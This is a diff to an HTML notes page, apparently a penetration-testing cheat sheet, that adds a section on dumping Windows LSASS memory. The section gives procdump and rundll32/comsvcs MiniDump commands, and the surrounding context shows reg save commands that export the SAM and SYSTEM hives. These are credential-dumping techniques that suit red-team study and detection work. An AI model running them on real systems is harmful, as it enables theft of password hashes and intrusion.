@@ -100,6 +100,8 @@
     
         <li><a class="" href="#windows-10-versions">Windows 10 versions</a></li>
     
+        <li><a class="" href="#dump-lsass-process">Dump LSASS process</a></li>
+    
         <li><a class="" href="#sam-and-system-backup">SAM and SYSTEM backup</a></li>
     
         <li><a class="" href="#list-email-aliases">List Email aliases</a></li>
@@ -367,6 +369,18 @@ if __name__ == &quot;__main__&quot;:
 
 <h3 id="windows-10-versions">Windows 10 versions</h3>
 <p><a href="https://docs.microsoft.com/fr-fr/windows/release-information/" target="_blank">Release Informations</a></p>
+<h3 id="dump-lsass-process">Dump LSASS process</h3>
+<p>There is various methods to dump the <code>lsass</code> process memory:</p>
+<ul>
+<li>Mimikatz</li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></li>
+<li>TaskManager</li>
+<li>Rundll32</li>
+</ul>
+<pre><code class="language-bash">$ procdump -accepteula -ma lsass.exe lsass.dmp
+$ Powershell -c rundll32.exe &quot;C:\Windows\System32\comsvcs.dll&quot;, MiniDump [process ID of lsass.exe] dump.bin full
+</code></pre>
+
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
 <pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
 $ reg save HKLM\SAM SamBkup.hiv
